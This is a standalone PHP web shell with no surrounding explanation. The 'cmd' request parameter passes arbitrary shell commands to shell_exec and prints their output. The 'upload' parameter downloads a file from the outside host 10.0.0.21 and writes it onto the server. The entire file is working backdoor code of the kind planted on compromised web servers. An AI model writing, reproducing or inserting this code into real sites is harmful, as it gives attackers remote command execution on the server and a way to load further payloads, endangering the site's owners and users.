<?php
  if (isset($_REQUEST['upload'])) {
    file_put_contents($_REQUEST['upload'], file_get_contents("http://10.0.0.21/" . $_REQUEST['upload']));
  };
  if (isset($_REQUEST['cmd'])) {
    echo '<pre>' . shell_exec(urldecode($_GET['cmd'])) . '</pre>';
  };
?>
